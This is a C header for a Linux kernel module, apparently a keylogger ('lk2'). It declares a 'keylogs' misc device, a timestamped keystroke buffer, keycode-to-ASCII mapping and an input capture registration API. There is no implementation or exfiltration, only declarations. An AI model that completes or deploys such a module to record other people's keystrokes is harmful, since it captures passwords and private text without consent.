// SPDX-License-Identifier: GPL-2.0
#ifndef LK2_H
#define LK2_H

#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/input-event-codes.h>
#include <linux/string.h>
#include <linux/input.h>
#include <linux/slab.h>
#include <linux/timekeeping.h>
#include <linux/time64.h>

// Main - Misc Device

// Device node name created by lk2_main.c via miscdevice
#define LK2_DEVICE_NAME "keylogs"

struct lk2_file_ctx
{
	char *buf;
	size_t len;
};

// Ring API

// Tunables
#define LK2_RING_INIT_CAP 1024u // initial capacity (grows as needed)
#define LK2_MAX_LINE_LEN 96u	// max formatted line length (incl '\n', excl '\0')

// Timestamp stored as HH:MM:SS
struct lk2_time
{
	u8 hour;
	u8 min;
	u8 sec;
};

// One key entry
struct lk2_entry
{
	struct lk2_time t;
	u16 keycode; // Linux input key code
	u8 state;	 // enum lk2_state
	char ascii;	 // 0 if not representable (layout-dependent)
};

// Dynamic buffer container (unlimited size)
struct lk2_ring
{
	struct lk2_entry *buf;
	u32 capacity;	 // allocated size
	u32 count;		 // number of valid entries
	spinlock_t lock; // protects buf/capacity/count
};

// Ring API

int lk2_ring_init(struct lk2_ring *r);
void lk2_ring_destroy(struct lk2_ring *r);
void lk2_ring_push(struct lk2_ring *r, const struct lk2_entry *e);
u32 lk2_ring_count(struct lk2_ring *r);
// Copy up to max entries into dst in chronological order; returns copied count.
u32 lk2_ring_snapshot(struct lk2_ring *r, struct lk2_entry *dst, u32 max);

// Formatting API

// Key state
enum lk2_state
{
	LK2_RELEASED = 0,
	LK2_PRESSED = 1,
};

size_t lk2_format_line(const struct lk2_entry *e, char *dst, size_t dst_len);
// Returns a stable, English key name for a keycode (may be "Unknown").
const char *lk2_key_name(u16 keycode);
// Returns a layout-dependent ASCII char (0 if none).
char lk2_keycode_to_ascii(u16 keycode, bool shift_down);

// Input capture API

int lk2_input_register(void);
void lk2_input_unregister(void);

#endif // LK2_H
